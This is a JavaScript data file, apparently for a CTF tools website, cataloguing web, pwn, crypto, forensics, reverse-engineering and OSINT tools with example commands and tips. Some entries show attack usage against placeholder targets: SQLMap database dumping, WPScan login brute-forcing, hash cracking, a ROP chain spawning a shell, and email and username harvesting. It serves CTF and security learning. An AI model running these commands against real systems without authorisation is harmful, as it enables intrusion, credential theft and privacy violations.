// CTF Tools Database
const ctfTools = [
    // Web Security Tools
    {
        id: 'burpsuite',
        name: 'Burp Suite',
        category: 'web',
        icon: 'fas fa-spider',
        difficulty: 'intermediate',
        description: 'Comprehensive web application security testing platform for intercepting and modifying HTTP requests.',
        tags: ['proxy', 'scanner', 'intruder', 'repeater'],
        commands: [
            {
                language: 'bash',
                description: 'Start Burp Suite Community Edition',
                code: 'java -jar burpsuite_community.jar'
            },
            {
                language: 'bash',
                description: 'Run Burp Suite with custom memory allocation',
                code: 'java -Xmx4g -jar burpsuite_community.jar'
            }
        ],
        usage: 'Essential for web application penetration testing. Configure browser proxy to 127.0.0.1:8080, intercept requests, and analyze responses.',
        tips: [
            'Use the Target tab to map application structure',
            'Enable automatic scanning for quick vulnerability detection',
            'Use Intruder for automated parameter fuzzing'
        ]
    },
    {
        id: 'dirsearch',
        name: 'DirSearch',
        category: 'web',
        icon: 'fas fa-folder-open',
        difficulty: 'beginner',
        description: 'Advanced command-line tool for brute-forcing directories and files on web servers.',
        tags: ['directory', 'bruteforce', 'enumeration'],
        commands: [
            {
                language: 'bash',
                description: 'Basic directory enumeration',
                code: 'python3 dirsearch.py -u http://target.com/'
            },
            {
                language: 'bash',
                description: 'Use custom wordlist',
                code: 'python3 dirsearch.py -u http://target.com/ -w /path/to/wordlist.txt'
            },
            {
                language: 'bash',
                description: 'Search for specific extensions',
                code: 'python3 dirsearch.py -u http://target.com/ -e php,html,js,txt'
            }
        ],
        usage: 'Discover hidden directories and files that might contain sensitive information or vulnerabilities.',
        tips: [
            'Use multiple wordlists for better coverage',
            'Check for backup files with extensions like .bak, .old',
            'Look for configuration files and admin panels'
        ]
    },
    {
        id: 'sqlmap',
        name: 'SQLMap',
        category: 'web',
        icon: 'fas fa-database',
        difficulty: 'intermediate',
        description: 'Automatic SQL injection detection and exploitation tool supporting multiple database types.',
        tags: ['sql-injection', 'database', 'exploitation'],
        commands: [
            {
                language: 'bash',
                description: 'Basic SQL injection test',
                code: 'sqlmap -u "http://target.com/page.php?id=1"'
            },
            {
                language: 'bash',
                description: 'Test POST parameters',
                code: 'sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"'
            },
            {
                language: 'bash',
                description: 'Dump database contents',
                code: 'sqlmap -u "http://target.com/page.php?id=1" --dump-all'
            }
        ],
        usage: 'Identify and exploit SQL injection vulnerabilities in web applications.',
        tips: [
            'Use --batch for non-interactive mode',
            'Specify --dbms for faster detection',
            'Use --tamper scripts to bypass WAF protection'
        ]
    },
    
    // PWN Tools
    {
        id: 'pwntools',
        name: 'pwntools',
        category: 'pwn',
        icon: 'fas fa-terminal',
        difficulty: 'intermediate',
        description: 'Python library for rapid exploit development and binary analysis.',
        tags: ['exploit', 'binary', 'rop', 'shellcode'],
        commands: [
            {
                language: 'python',
                description: 'Basic remote connection',
                code: `from pwn import *
r = remote('target.com', 1337)
r.sendline(b'payload')
response = r.recvline()`
            },
            {
                language: 'python',
                description: 'ROP chain generation',
                code: `from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', ['/bin/sh'])
print(rop.dump())`
            }
        ],
        usage: 'Essential toolkit for binary exploitation, CTF challenges, and exploit development.',
        tips: [
            'Use context.arch to set target architecture',
            'Utilize shellcraft for shellcode generation',
            'cyclic() function helps find buffer overflow offsets'
        ]
    },
    {
        id: 'gdb-gef',
        name: 'GDB with GEF',
        category: 'pwn',
        icon: 'fas fa-bug',
        difficulty: 'advanced',
        description: 'Enhanced GDB debugger with exploit development features and modern interface.',
        tags: ['debugger', 'reverse-engineering', 'memory'],
        commands: [
            {
                language: 'bash',
                description: 'Start GDB with GEF',
                code: 'gdb ./binary'
            },
            {
                language: 'gdb',
                description: 'Set breakpoint and run',
                code: 'break main\nrun\ninfo registers\ntelescope $rsp'
            },
            {
                language: 'gdb',
                description: 'Find ROP gadgets',
                code: 'ropper --file ./binary --search "pop rdi"'
            }
        ],
        usage: 'Debug binaries, analyze memory layout, and develop exploits with enhanced visualization.',
        tips: [
            'Use telescope to examine memory contents',
            'pattern create/search for buffer overflow analysis',
            'checksec shows binary security features'
        ]
    },
    {
        id: 'checksec',
        name: 'checksec.sh',
        category: 'pwn',
        icon: 'fas fa-shield-alt',
        difficulty: 'beginner',
        description: 'Security property checker for binaries and running processes.',
        tags: ['security', 'analysis', 'binary'],
        commands: [
            {
                language: 'bash',
                description: 'Check binary security features',
                code: 'checksec --file=./binary'
            },
            {
                language: 'bash',
                description: 'Check running process',
                code: 'checksec --proc=process_name'
            }
        ],
        usage: 'Quickly identify enabled security mechanisms in binaries before exploitation.',
        tips: [
            'Look for ASLR, NX, Stack Canaries, PIE',
            'Disabled protections indicate easier exploitation',
            'Use with other tools for comprehensive analysis'
        ]
    },
    
    // Cryptography Tools
    {
        id: 'rsactftool',
        name: 'RsaCtfTool',
        category: 'crypto',
        icon: 'fas fa-key',
        difficulty: 'intermediate',
        description: 'Comprehensive RSA attack tool for various cryptographic vulnerabilities.',
        tags: ['rsa', 'factorization', 'crypto-attacks'],
        commands: [
            {
                language: 'bash',
                description: 'Basic RSA attack',
                code: 'python3 RsaCtfTool.py --publickey public.pem --uncipherfile cipher.txt'
            },
            {
                language: 'bash',
                description: 'Factorize weak RSA key',
                code: 'python3 RsaCtfTool.py --publickey public.pem --private'
            }
        ],
        usage: 'Exploit common RSA implementation vulnerabilities in CTF challenges.',
        tips: [
            'Works with multiple attack methods automatically',
            'Can handle multiple public keys',
            'Supports various RSA attack vectors'
        ]
    },
    {
        id: 'hashcat',
        name: 'Hashcat',
        category: 'crypto',
        icon: 'fas fa-hashtag',
        difficulty: 'intermediate',
        description: 'Advanced password recovery tool supporting numerous hashing algorithms.',
        tags: ['password', 'cracking', 'hash'],
        commands: [
            {
                language: 'bash',
                description: 'Crack MD5 hash',
                code: 'hashcat -m 0 -a 0 hash.txt wordlist.txt'
            },
            {
                language: 'bash',
                description: 'Brute force with mask',
                code: 'hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a'
            }
        ],
        usage: 'Crack password hashes using dictionary attacks, brute force, and rule-based attacks.',
        tips: [
            'Use GPU acceleration for better performance',
            'Check hashcat examples for hash types',
            'Combine multiple attack modes for better results'
        ]
    },
    {
        id: 'john',
        name: 'John the Ripper',
        category: 'crypto',
        icon: 'fas fa-hammer',
        difficulty: 'intermediate',
        description: 'Fast password cracker with support for many ciphers and hash types.',
        tags: ['password', 'cracking', 'hash'],
        commands: [
            {
                language: 'bash',
                description: 'Crack password file',
                code: 'john --wordlist=rockyou.txt hashes.txt'
            },
            {
                language: 'bash',
                description: 'Show cracked passwords',
                code: 'john --show hashes.txt'
            }
        ],
        usage: 'Crack various types of password hashes and encrypted files.',
        tips: [
            'Use different formats with --format option',
            'Generate custom wordlists with --stdout',
            'Use rules to modify dictionary words'
        ]
    },
    
    // Forensics Tools
    {
        id: 'binwalk',
        name: 'Binwalk',
        category: 'forensics',
        icon: 'fas fa-file-archive',
        difficulty: 'beginner',
        description: 'Tool for analyzing and extracting firmware images and embedded files.',
        tags: ['firmware', 'extraction', 'analysis'],
        commands: [
            {
                language: 'bash',
                description: 'Analyze file structure',
                code: 'binwalk firmware.bin'
            },
            {
                language: 'bash',
                description: 'Extract embedded files',
                code: 'binwalk -e firmware.bin'
            }
        ],
        usage: 'Identify and extract embedded files, filesystems, and data from binary files.',
        tips: [
            'Use -M for recursive extraction',
            'Check for hidden filesystems',
            'Analyze entropy with --entropy option'
        ]
    },
    {
        id: 'volatility',
        name: 'Volatility',
        category: 'forensics',
        icon: 'fas fa-memory',
        difficulty: 'advanced',
        description: 'Advanced memory forensics framework for analyzing RAM dumps.',
        tags: ['memory', 'forensics', 'malware'],
        commands: [
            {
                language: 'bash',
                description: 'List running processes',
                code: 'python vol.py -f memory.dump --profile=Win7SP1x64 pslist'
            },
            {
                language: 'bash',
                description: 'Dump process memory',
                code: 'python vol.py -f memory.dump --profile=Win7SP1x64 memdump -p 1234 -D output/'
            }
        ],
        usage: 'Analyze memory dumps to extract processes, network connections, and malware artifacts.',
        tips: [
            'Determine correct profile with imageinfo',
            'Use different plugins for specific artifacts',
            'Timeline analysis with timeliner plugin'
        ]
    },
    {
        id: 'exiftool',
        name: 'ExifTool',
        category: 'forensics',
        icon: 'fas fa-image',
        difficulty: 'beginner',
        description: 'Powerful metadata reader/writer for various file formats.',
        tags: ['metadata', 'exif', 'steganography'],
        commands: [
            {
                language: 'bash',
                description: 'Extract all metadata',
                code: 'exiftool image.jpg'
            },
            {
                language: 'bash',
                description: 'Remove all metadata',
                code: 'exiftool -all= image.jpg'
            }
        ],
        usage: 'Extract hidden information from file metadata, often containing valuable clues.',
        tips: [
            'Check GPS coordinates in image metadata',
            'Look for software information and timestamps',
            'Use -v for verbose output with hex values'
        ]
    },
    
    // Reverse Engineering Tools
    {
        id: 'ghidra',
        name: 'Ghidra',
        category: 'reverse',
        icon: 'fas fa-search-plus',
        difficulty: 'advanced',
        description: 'NSA\'s powerful reverse engineering suite with decompiler support.',
        tags: ['disassembler', 'decompiler', 'analysis'],
        commands: [
            {
                language: 'bash',
                description: 'Launch Ghidra',
                code: 'ghidraRun'
            },
            {
                language: 'bash',
                description: 'Headless analysis',
                code: 'analyzeHeadless /path/to/project ProjectName -import binary.exe'
            }
        ],
        usage: 'Comprehensive reverse engineering platform for analyzing malware and proprietary software.',
        tips: [
            'Use auto-analysis for initial overview',
            'Custom scripts can automate analysis tasks',
            'Collaborative features for team analysis'
        ]
    },
    {
        id: 'radare2',
        name: 'Radare2',
        category: 'reverse',
        icon: 'fas fa-code',
        difficulty: 'advanced',
        description: 'Unix-like reverse engineering framework and command-line tools.',
        tags: ['disassembler', 'debugger', 'hex-editor'],
        commands: [
            {
                language: 'bash',
                description: 'Open binary in radare2',
                code: 'r2 binary'
            },
            {
                language: 'r2',
                description: 'Analyze and disassemble',
                code: 'aaa\npdf @main'
            }
        ],
        usage: 'Powerful command-line reverse engineering toolkit with extensive scripting capabilities.',
        tips: [
            'Use visual mode with V for easier navigation',
            'r2pipe for automation scripts',
            'Extensive plugin ecosystem available'
        ]
    },
    {
        id: 'strings',
        name: 'strings',
        category: 'reverse',
        icon: 'fas fa-quote-right',
        difficulty: 'beginner',
        description: 'Extract printable strings from binary files.',
        tags: ['strings', 'analysis', 'reconnaissance'],
        commands: [
            {
                language: 'bash',
                description: 'Extract strings from binary',
                code: 'strings binary'
            },
            {
                language: 'bash',
                description: 'Find strings with minimum length',
                code: 'strings -n 8 binary | grep -i password'
            }
        ],
        usage: 'Quick way to find hardcoded strings, URLs, and potential clues in binaries.',
        tips: [
            'Pipe output to grep for specific patterns',
            'Use -e flag for different character encodings',
            'Combine with other tools for comprehensive analysis'
        ]
    },
    
    // OSINT Tools
    {
        id: 'sherlock',
        name: 'Sherlock',
        category: 'osint',
        icon: 'fas fa-user-secret',
        difficulty: 'beginner',
        description: 'Hunt down social media accounts by username across 400+ social networks.',
        tags: ['username', 'social-media', 'reconnaissance'],
        commands: [
            {
                language: 'bash',
                description: 'Search username across platforms',
                code: 'python3 sherlock.py username'
            },
            {
                language: 'bash',
                description: 'Save results to file',
                code: 'python3 sherlock.py --output results.txt username'
            }
        ],
        usage: 'Discover social media presence and gather intelligence on usernames.',
        tips: [
            'Use --timeout to adjust request timeouts',
            'Check specific sites with --site option',
            'Combine with other OSINT tools for better results'
        ]
    },
    {
        id: 'theHarvester',
        name: 'theHarvester',
        category: 'osint',
        icon: 'fas fa-search',
        difficulty: 'intermediate',
        description: 'Gather emails, subdomains, hosts, employee names from different public sources.',
        tags: ['email', 'subdomain', 'reconnaissance'],
        commands: [
            {
                language: 'bash',
                description: 'Harvest emails from domain',
                code: 'theHarvester -d example.com -l 500 -b google'
            },
            {
                language: 'bash',
                description: 'Use multiple sources',
                code: 'theHarvester -d example.com -l 500 -b google,bing,yahoo'
            }
        ],
        usage: 'Collect information about target domains from public sources.',
        tips: [
            'Use API keys for better results from some sources',
            'Combine results from multiple search engines',
            'Verify collected email addresses separately'
        ]
    },
    {
        id: 'recon-ng',
        name: 'Recon-ng',
        category: 'osint',
        icon: 'fas fa-satellite-dish',
        difficulty: 'intermediate',
        description: 'Full-featured reconnaissance framework for gathering open source intelligence.',
        tags: ['reconnaissance', 'framework', 'automation'],
        commands: [
            {
                language: 'bash',
                description: 'Launch Recon-ng',
                code: 'recon-ng'
            },
            {
                language: 'recon-ng',
                description: 'Load and run module',
                code: 'modules load recon/domains-hosts/google_site_web\noptions set SOURCE example.com\nrun'
            }
        ],
        usage: 'Comprehensive OSINT framework with numerous modules for information gathering.',
        tips: [
            'Install marketplace modules for extended functionality',
            'Use workspaces to organize different targets',
            'API keys enhance module capabilities'
        ]
    },
    
    // Miscellaneous Tools
    {
        id: 'cyberchef',
        name: 'CyberChef',
        category: 'misc',
        icon: 'fas fa-magic',
        difficulty: 'beginner',
        description: 'Web-based tool for data analysis and transformation with drag-and-drop operations.',
        tags: ['encoding', 'decoding', 'analysis'],
        commands: [
            {
                language: 'url',
                description: 'Access CyberChef online',
                code: 'https://gchq.github.io/CyberChef/'
            }
        ],
        usage: 'Swiss Army knife for data transformation, encoding/decoding, and cryptographic operations.',
        tips: [
            'Chain multiple operations together',
            'Use the Magic operation for automatic detection',
            'Save recipes for reuse'
        ]
    },
    {
        id: 'z3',
        name: 'Z3 Theorem Prover',
        category: 'misc',
        icon: 'fas fa-calculator',
        difficulty: 'advanced',
        description: 'High-performance theorem prover for constraint solving and symbolic execution.',
        tags: ['solver', 'constraints', 'symbolic'],
        commands: [
            {
                language: 'python',
                description: 'Basic constraint solving',
                code: `from z3 import *
x = Int('x')
solver = Solver()
solver.add(x > 0, x < 10)
if solver.check() == sat:
    print(solver.model())`
            }
        ],
        usage: 'Solve complex mathematical constraints and symbolic execution problems.',
        tips: [
            'Useful for reverse engineering algorithms',
            'Can solve cryptographic challenges',
            'Supports various data types and theories'
        ]
    },
    {
        id: 'nmap',
        name: 'Nmap',
        category: 'misc',
        icon: 'fas fa-network-wired',
        difficulty: 'intermediate',
        description: 'Network discovery and security auditing utility.',
        tags: ['network', 'scanning', 'reconnaissance'],
        commands: [
            {
                language: 'bash',
                description: 'Basic port scan',
                code: 'nmap -sS target.com'
            },
            {
                language: 'bash',
                description: 'Service version detection',
                code: 'nmap -sV -sC target.com'
            }
        ],
        usage: 'Discover hosts, services, and vulnerabilities on networks.',
        tips: [
            'Use NSE scripts for vulnerability detection',
            'Different scan types for different scenarios',
            'Be mindful of rate limiting and detection'
        ]
    },
    
    // Additional Web Security Tools
    {
        id: 'nikto',
        name: 'Nikto',
        category: 'web',
        icon: 'fas fa-search-location',
        difficulty: 'beginner',
        description: 'Web server scanner that tests for thousands of known vulnerabilities and misconfigurations.',
        tags: ['scanner', 'vulnerability', 'web-server'],
        commands: [
            {
                language: 'bash',
                description: 'Basic web vulnerability scan',
                code: 'nikto -h http://target.com'
            },
            {
                language: 'bash',
                description: 'Scan HTTPS with SSL support',
                code: 'nikto -h https://target.com'
            },
            {
                language: 'bash',
                description: 'Save output to file',
                code: 'nikto -h target.com -output nikto_scan.txt'
            },
            {
                language: 'bash',
                description: 'Scan specific port',
                code: 'nikto -h target.com -p 8080'
            }
        ],
        usage: 'Identify web server vulnerabilities, misconfigurations, and outdated software versions.',
        tips: [
            'Use with web proxy for manual analysis',
            'Check for specific CVEs in results',
            'Combine with other web scanners for comprehensive coverage'
        ]
    },
    {
        id: 'gobuster',
        name: 'Gobuster',
        category: 'web',
        icon: 'fas fa-folder-tree',
        difficulty: 'beginner',
        description: 'Fast directory and file enumeration tool for web applications.',
        tags: ['directory', 'enumeration', 'bruteforce'],
        commands: [
            {
                language: 'bash',
                description: 'Basic directory enumeration',
                code: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt'
            },
            {
                language: 'bash',
                description: 'Search for specific file extensions',
                code: 'gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt,bak'
            },
            {
                language: 'bash',
                description: 'Use cookies for authenticated scanning',
                code: 'gobuster dir -u http://target.com -w wordlist.txt -c "PHPSESSID=cookie_value"'
            },
            {
                language: 'bash',
                description: 'Skip SSL verification',
                code: 'gobuster dir -k -u https://target.com -w wordlist.txt'
            }
        ],
        usage: 'Discover hidden directories, files, and admin panels on web servers.',
        tips: [
            'Try multiple wordlists for better coverage',
            'Look for backup files with .bak, .old extensions',
            'Check status codes 200, 301, 302, 403 for interesting paths'
        ]
    },
    {
        id: 'wpscan',
        name: 'WPScan',
        category: 'web',
        icon: 'fab fa-wordpress',
        difficulty: 'intermediate',
        description: 'WordPress security scanner for vulnerabilities, themes, and plugins.',
        tags: ['wordpress', 'cms', 'scanner'],
        commands: [
            {
                language: 'bash',
                description: 'Enumerate WordPress users and vulnerabilities',
                code: 'wpscan --url http://target.com --enumerate u,vt,tt,cb,dbe'
            },
            {
                language: 'bash',
                description: 'Brute force WordPress login',
                code: 'wpscan --url http://target.com --usernames admin --passwords wordlist.txt'
            },
            {
                language: 'bash',
                description: 'Aggressive plugin detection',
                code: 'wpscan --url http://target.com --plugins-detection aggressive'
            }
        ],
        usage: 'Identify WordPress vulnerabilities, enumerate users, and test for weak passwords.',
        tips: [
            'Check wp-includes/version.php for version info',
            'Look for outdated plugins and themes',
            'Use found usernames for targeted attacks'
        ]
    },
    {
        id: 'cewl',
        name: 'CeWL',
        category: 'web',
        icon: 'fas fa-globe',
        difficulty: 'beginner',
        description: 'Custom wordlist generator that spiders websites to extract words.',
        tags: ['wordlist', 'crawler', 'reconnaissance'],
        commands: [
            {
                language: 'bash',
                description: 'Generate wordlist from website',
                code: 'cewl -w wordlist.txt -d 10 -m 1 http://target.com'
            },
            {
                language: 'bash',
                description: 'Include email addresses',
                code: 'cewl -e -w emails.txt http://target.com'
            },
            {
                language: 'bash',
                description: 'Use custom user agent',
                code: 'cewl -a "Mozilla/5.0" -w wordlist.txt http://target.com'
            }
        ],
        usage: 'Create custom wordlists for password attacks based on target website content.',
        tips: [
            'Increase depth for more comprehensive wordlists',
            'Combine with other wordlists for better coverage',
            'Use generated words for login brute forcing'
        ]
    },
    
    // Additional PWN Tools
    {
        id: 'ropper',
        name: 'Ropper',
        category: 'pwn',
        icon: 'fas fa-link',
        difficulty: 'advanced',
        description: 'Tool for finding ROP gadgets in binaries for exploitation.',
        tags: ['rop', 'gadgets', 'exploitation'],
        commands: [
            {
                language: 'bash',
                description: 'Find ROP gadgets',
                code: 'ropper --file binary --search "pop rdi"'
            },
            {
                language: 'bash',
                description: 'List all gadgets',
                code: 'ropper --file binary --gadgets'
            },
            {
                language: 'bash',
                description: 'Find syscall gadgets',
                code: 'ropper --file binary --search "syscall"'
            }
        ],
        usage: 'Discover ROP gadgets for building exploitation chains in buffer overflow attacks.',
        tips: [
            'Look for pop instructions for register control',
            'Find syscall or int 0x80 for system calls',
            'Chain gadgets to control program execution'
        ]
    },
    {
        id: 'oneshot',
        name: 'one_gadget',
        category: 'pwn',
        icon: 'fas fa-bullseye',
        difficulty: 'advanced',
        description: 'Tool to find one-shot RCE gadgets in libc for quick exploitation.',
        tags: ['libc', 'rce', 'gadget'],
        commands: [
            {
                language: 'bash',
                description: 'Find one-shot gadgets in libc',
                code: 'one_gadget /lib/x86_64-linux-gnu/libc.so.6'
            },
            {
                language: 'bash',
                description: 'Find gadgets with specific constraints',
                code: 'one_gadget libc.so.6 --level 1'
            }
        ],
        usage: 'Quickly find execve gadgets in libc for immediate shell access.',
        tips: [
            'Check constraints for each gadget',
            'Use with libc database for remote exploitation',
            'Verify gadget constraints before exploitation'
        ]
    },
    {
        id: 'pwninit',
        name: 'pwninit',
        category: 'pwn',
        icon: 'fas fa-rocket',
        difficulty: 'intermediate',
        description: 'Tool to automate CTF pwn challenge setup with correct libc and ld.',
        tags: ['setup', 'libc', 'automation'],
        commands: [
            {
                language: 'bash',
                description: 'Initialize pwn challenge',
                code: 'pwninit'
            },
            {
                language: 'bash',
                description: 'Specify custom libc',
                code: 'pwninit --libc libc.so.6'
            }
        ],
        usage: 'Automatically setup CTF challenges with proper library versions for exploitation.',
        tips: [
            'Creates patched binary with correct libc',
            'Generates basic exploit template',
            'Saves time on challenge setup'
        ]
    },
    {
        id: 'cyclic',
        name: 'pwntools cyclic',
        category: 'pwn',
        icon: 'fas fa-repeat',
        difficulty: 'beginner',
        description: 'Generate and analyze cyclic patterns for finding buffer overflow offsets.',
        tags: ['buffer-overflow', 'offset', 'pattern'],
        commands: [
            {
                language: 'bash',
                description: 'Generate cyclic pattern',
                code: 'pwn cyclic 100'
            },
            {
                language: 'bash',
                description: 'Find offset from crash value',
                code: 'pwn cyclic -l 0x61616161'
            },
            {
                language: 'python',
                description: 'Generate pattern in script',
                code: 'from pwn import *\npattern = cyclic(100)\noffset = cyclic_find(0x61616161)'
            }
        ],
        usage: 'Determine exact offset for buffer overflow exploitation.',
        tips: [
            'Use with GDB to find crash addresses',
            'Generate patterns longer than expected buffer',
            'Combine with debugging to verify offsets'
        ]
    },
    
    // Additional Crypto Tools
    {
        id: 'factordb',
        name: 'FactorDB',
        category: 'crypto',
        icon: 'fas fa-calculator',
        difficulty: 'beginner',
        description: 'Online database for integer factorization - useful for weak RSA keys.',
        tags: ['factorization', 'rsa', 'database'],
        commands: [
            {
                language: 'url',
                description: 'Access FactorDB website',
                code: 'http://factordb.com'
            },
            {
                language: 'python',
                description: 'Check factorization programmatically',
                code: 'import requests\nn = 123456789\nresponse = requests.get(f"http://factordb.com/api?query={n}")'
            }
        ],
        usage: 'Check if large integers have known factorizations for RSA attacks.',
        tips: [
            'Always check RSA modulus factorization first',
            'Look for common factors between keys',
            'Use for CTF challenges with weak RSA implementations'
        ]
    },
    {
        id: 'msieve',
        name: 'Msieve',
        category: 'crypto',
        icon: 'fas fa-divide',
        difficulty: 'advanced',
        description: 'Advanced integer factorization tool for breaking RSA keys.',
        tags: ['factorization', 'rsa', 'quadratic-sieve'],
        commands: [
            {
                language: 'bash',
                description: 'Factor large integer',
                code: 'msieve -q large_number'
            },
            {
                language: 'bash',
                description: 'Use with verbose output',
                code: 'msieve -v large_number'
            }
        ],
        usage: 'Factor semi-prime numbers for RSA private key recovery.',
        tips: [
            'More powerful than basic trial division',
            'Can factor numbers up to certain bit lengths',
            'Use when FactorDB fails'
        ]
    },
    {
        id: 'featherduster',
        name: 'FeatherDuster',
        category: 'crypto',
        icon: 'fas fa-feather-alt',
        difficulty: 'intermediate',
        description: 'Automated cryptanalysis tool for breaking various encryption schemes.',
        tags: ['automated', 'cryptanalysis', 'breaking'],
        commands: [
            {
                language: 'python',
                description: 'Analyze ciphertext',
                code: 'python featherduster.py'
            },
            {
                language: 'python',
                description: 'Load from file',
                code: 'python featherduster.py -f ciphertext.txt'
            }
        ],
        usage: 'Automatically identify and break weak encryption implementations.',
        tips: [
            'Tries multiple attack vectors automatically',
            'Good for unknown cipher identification',
            'Provides detailed analysis results'
        ]
    },
    {
        id: 'sage',
        name: 'SageMath',
        category: 'crypto',
        icon: 'fas fa-square-root-alt',
        difficulty: 'expert',
        description: 'Advanced mathematical software for cryptographic calculations and attacks.',
        tags: ['mathematics', 'cryptography', 'computation'],
        commands: [
            {
                language: 'sage',
                description: 'Basic RSA factorization',
                code: 'n = 123456789\nfactor(n)'
            },
            {
                language: 'sage',
                description: 'Elliptic curve operations',
                code: 'E = EllipticCurve(GF(p), [a, b])\nP = E(x, y)'
            }
        ],
        usage: 'Perform complex mathematical operations for advanced cryptographic attacks.',
        tips: [
            'Powerful for elliptic curve cryptography',
            'Can solve discrete logarithm problems',
            'Essential for research-level crypto challenges'
        ]
    },
    
    // Additional Forensics Tools
    {
        id: 'foremost',
        name: 'Foremost',
        category: 'forensics',
        icon: 'fas fa-search-plus',
        difficulty: 'beginner',
        description: 'File carving tool to recover deleted or hidden files from disk images.',
        tags: ['carving', 'recovery', 'deleted-files'],
        commands: [
            {
                language: 'bash',
                description: 'Carve files from disk image',
                code: 'foremost -i disk.img -o output_dir'
            },
            {
                language: 'bash',
                description: 'Carve specific file types',
                code: 'foremost -t jpg,png,pdf -i disk.img -o output_dir'
            }
        ],
        usage: 'Recover deleted files and hidden data from memory dumps or disk images.',
        tips: [
            'Check output directory for recovered files',
            'Use with different file type configurations',
            'Combine with other forensics tools'
        ]
    },
    {
        id: 'scalpel',
        name: 'Scalpel',
        category: 'forensics',
        icon: 'fas fa-cut',
        difficulty: 'intermediate',
        description: 'Advanced file carving tool with configurable file signatures.',
        tags: ['carving', 'signatures', 'recovery'],
        commands: [
            {
                language: 'bash',
                description: 'Carve with custom config',
                code: 'scalpel -c scalpel.conf -o output_dir disk.img'
            },
            {
                language: 'bash',
                description: 'Preview mode (no extraction)',
                code: 'scalpel -p -c scalpel.conf disk.img'
            }
        ],
        usage: 'Extract files based on header and footer signatures from raw data.',
        tips: [
            'Customize scalpel.conf for specific file types',
            'More precise than foremost',
            'Good for custom file format recovery'
        ]
    },
    {
        id: 'autopsy',
        name: 'Autopsy',
        category: 'forensics',
        icon: 'fas fa-microscope',
        difficulty: 'intermediate',
        description: 'Digital forensics platform with GUI for investigating disk images.',
        tags: ['gui', 'investigation', 'timeline'],
        commands: [
            {
                language: 'bash',
                description: 'Start Autopsy server',
                code: 'autopsy'
            },
            {
                language: 'url',
                description: 'Access web interface',
                code: 'http://localhost:9999/autopsy'
            }
        ],
        usage: 'Comprehensive forensic analysis of disk images with timeline reconstruction.',
        tips: [
            'Create new case for each investigation',
            'Use keyword search for flag hunting',
            'Check file system timeline for activities'
        ]
    },
    {
        id: 'steghide',
        name: 'Steghide',
        category: 'forensics',
        icon: 'fas fa-eye-slash',
        difficulty: 'beginner',
        description: 'Steganography tool for hiding and extracting data in image and audio files.',
        tags: ['steganography', 'hiding', 'extraction'],
        commands: [
            {
                language: 'bash',
                description: 'Extract hidden data',
                code: 'steghide extract -sf image.jpg'
            },
            {
                language: 'bash',
                description: 'Extract with password',
                code: 'steghide extract -sf image.jpg -p password'
            },
            {
                language: 'bash',
                description: 'Check for hidden data',
                code: 'steghide info image.jpg'
            }
        ],
        usage: 'Detect and extract hidden messages from images and audio files.',
        tips: [
            'Try common passwords if extraction fails',
            'Works with JPEG, BMP, WAV, AU files',
            'Use brute force tools for unknown passwords'
        ]
    },
    
    // Additional Reverse Engineering Tools
    {
        id: 'ida',
        name: 'IDA Pro',
        category: 'reverse',
        icon: 'fas fa-microchip',
        difficulty: 'expert',
        description: 'Industry-standard disassembler and debugger for reverse engineering.',
        tags: ['disassembler', 'debugger', 'professional'],
        commands: [
            {
                language: 'bash',
                description: 'Launch IDA Pro',
                code: 'ida64'
            },
            {
                language: 'bash',
                description: 'Batch analysis',
                code: 'ida64 -B binary'
            }
        ],
        usage: 'Professional-grade reverse engineering with advanced analysis capabilities.',
        tips: [
            'Use IDA Free for basic analysis',
            'Learn IDAPython for automation',
            'Create custom signatures for malware analysis'
        ]
    },
    {
        id: 'gdbdashboard',
        name: 'GDB Dashboard',
        category: 'reverse',
        icon: 'fas fa-tachometer-alt',
        difficulty: 'intermediate',
        description: 'Modular visual interface for GDB with real-time information display.',
        tags: ['debugger', 'visual', 'interface'],
        commands: [
            {
                language: 'bash',
                description: 'Install GDB Dashboard',
                code: 'wget -P ~ git.io/.gdbinit'
            },
            {
                language: 'gdb',
                description: 'Use with GDB',
                code: 'gdb ./binary\n(gdb) dashboard'
            }
        ],
        usage: 'Enhanced GDB experience with visual memory, register, and stack views.',
        tips: [
            'Shows assembly, memory, and registers simultaneously',
            'Highly customizable layout',
            'Great for learning assembly debugging'
        ]
    },
    {
        id: 'upx',
        name: 'UPX',
        category: 'reverse',
        icon: 'fas fa-compress-arrows-alt',
        difficulty: 'beginner',
        description: 'Ultimate Packer for eXecutables - compress and decompress binary files.',
        tags: ['packer', 'compression', 'unpacking'],
        commands: [
            {
                language: 'bash',
                description: 'Decompress packed binary',
                code: 'upx -d packed_binary'
            },
            {
                language: 'bash',
                description: 'Check if file is packed',
                code: 'upx -t binary'
            },
            {
                language: 'bash',
                description: 'Force decompression',
                code: 'upx -d --force packed_binary'
            }
        ],
        usage: 'Unpack UPX-compressed binaries for analysis.',
        tips: [
            'Many CTF binaries are UPX packed',
            'Always try unpacking before analysis',
            'Use with other unpackers for unknown packers'
        ]
    },
    {
        id: 'ltrace',
        name: 'ltrace',
        category: 'reverse',
        icon: 'fas fa-route',
        difficulty: 'beginner',
        description: 'Library call tracer for dynamic analysis of program execution.',
        tags: ['tracing', 'library-calls', 'dynamic'],
        commands: [
            {
                language: 'bash',
                description: 'Trace library calls',
                code: 'ltrace ./binary'
            },
            {
                language: 'bash',
                description: 'Trace with string length',
                code: 'ltrace -s 100 ./binary'
            },
            {
                language: 'bash',
                description: 'Save trace to file',
                code: 'ltrace -o trace.log ./binary'
            }
        ],
        usage: 'Monitor library function calls to understand program behavior.',
        tips: [
            'Look for strcmp, strcpy, malloc calls',
            'Increase string length for full output',
            'Combine with strace for complete analysis'
        ]
    },
    
    // Additional OSINT Tools
    {
        id: 'amass',
        name: 'Amass',
        category: 'osint',
        icon: 'fas fa-sitemap',
        difficulty: 'intermediate',
        description: 'Network mapping and attack surface discovery tool.',
        tags: ['subdomain', 'enumeration', 'mapping'],
        commands: [
            {
                language: 'bash',
                description: 'Enumerate subdomains',
                code: 'amass enum -d example.com'
            },
            {
                language: 'bash',
                description: 'Use all data sources',
                code: 'amass enum -src -d example.com'
            },
            {
                language: 'bash',
                description: 'Save results to file',
                code: 'amass enum -d example.com -o subdomains.txt'
            }
        ],
        usage: 'Discover subdomains and map attack surface of target domains.',
        tips: [
            'Use API keys for better results',
            'Combine with other subdomain tools',
            'Check for subdomain takeover opportunities'
        ]
    },
    {
        id: 'spiderfoot',
